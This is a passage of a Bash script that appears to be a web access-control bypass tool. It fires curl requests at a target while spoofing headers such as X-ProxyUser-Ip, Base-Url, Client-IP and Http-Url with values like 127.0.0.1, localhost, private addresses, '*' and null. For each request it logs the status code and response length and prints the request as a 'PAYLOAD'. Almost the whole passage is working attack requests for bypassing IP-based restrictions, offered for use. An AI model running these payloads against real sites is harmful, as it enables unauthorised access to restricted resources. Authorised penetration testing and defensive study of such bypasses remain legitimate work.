	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-ProxyUser-Ip: ${website_ip}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-ProxyUser-Ip Payload: 127.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-ProxyUser-Ip: 127.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-ProxyUser-Ip: 127.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-ProxyUser-Ip Payload: *"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-ProxyUser-Ip: *" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-ProxyUser-Ip: *' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-ProxyUser-Ip Payload: 8.8.8.8"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-ProxyUser-Ip: 8.8.8.8" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-ProxyUser-Ip: 8.8.8.8' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-ProxyUser-Ip Payload: null"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-ProxyUser-Ip: null" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-ProxyUser-Ip: null' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-ProxyUser-Ip Payload: 192.168.0.2"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-ProxyUser-Ip: 192.168.0.2" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-ProxyUser-Ip: 192.168.0.2' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-ProxyUser-Ip Payload: 10.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-ProxyUser-Ip: 10.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-ProxyUser-Ip: 10.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-ProxyUser-Ip Payload: 0.0.0.0"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-ProxyUser-Ip: 0.0.0.0" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-ProxyUser-Ip: 0.0.0.0' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-ProxyUser-Ip Payload: localhost"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-ProxyUser-Ip: localhost" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-ProxyUser-Ip: localhost' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-ProxyUser-Ip Payload: 192.168.1.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-ProxyUser-Ip: 192.168.1.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-ProxyUser-Ip: 192.168.1.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	
	echo -n "Base-Url Payload: ${website_ip}"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Base-Url: ${website_ip}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Base-Url: ${website_ip}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Base-Url Payload: 127.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Base-Url: 127.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Base-Url: 127.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Base-Url Payload: *"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Base-Url: *" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Base-Url: *' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Base-Url Payload: 8.8.8.8"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Base-Url: 8.8.8.8" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Base-Url: 8.8.8.8' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Base-Url Payload: null"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Base-Url: null" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Base-Url: null' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Base-Url Payload: 192.168.0.2"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Base-Url: 192.168.0.2" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Base-Url: 192.168.0.2' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Base-Url Payload: 10.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Base-Url: 10.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Base-Url: 10.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Base-Url Payload: 0.0.0.0"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Base-Url: 0.0.0.0" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Base-Url: 0.0.0.0' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Base-Url Payload: localhost"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Base-Url: localhost" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Base-Url: localhost' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Base-Url Payload: 192.168.1.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Base-Url: 192.168.1.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Base-Url: 192.168.1.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"


	echo -n "Client-IP Payload: ${website_ip}"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Client-IP: ${website_ip}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Client-IP: ${website_ip}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Client-IP Payload: 127.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Client-IP: 127.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Client-IP: 127.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Client-IP Payload: *"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Client-IP: *" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Client-IP: *' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Client-IP Payload: 8.8.8.8"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Client-IP: 8.8.8.8" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Client-IP: 8.8.8.8' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Client-IP Payload: null"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Client-IP: null" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Client-IP: null' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Client-IP Payload: 192.168.0.2"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Client-IP: 192.168.0.2" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Client-IP: 192.168.0.2' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Client-IP Payload: 10.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Client-IP: 10.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Client-IP: 10.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Client-IP Payload: 0.0.0.0"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Client-IP: 0.0.0.0" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Client-IP: 0.0.0.0' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Client-IP Payload: localhost"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Client-IP: localhost" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Client-IP: localhost' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Client-IP Payload: 192.168.1.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Client-IP: 192.168.1.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Client-IP: 192.168.1.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"


	echo -n "Http-Url Payload: ${website_ip}"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Http-Url: ${website_ip}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Http-Url: ${website_ip}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Http-Url Payload: 127.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Http-Url: 127.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Http-Url: 127.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Http-Url Payload: *"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Http-Url: *" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Http-Url: *' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Http-Url Payload: 8.8.8.8"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Http-Url: 8.8.8.8" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Http-Url: 8.8.8.8' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Http-Url Payload: null"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Http-Url: null" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Http-Url: null' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Http-Url Payload: 192.168.0.2"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Http-Url: 192.168.0.2" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Http-Url: 192.168.0.2' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Http-Url Payload: 10.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Http-Url: 10.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Http-Url: 10.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Http-Url Payload: 0.0.0.0"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Http-Url: 0.0.0.0" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Http-Url: 0.0.0.0' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Http-Url Payload: localhost"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Http-Url: localhost" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Http-Url: localhost' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Http-Url Payload: 192.168.1.1"
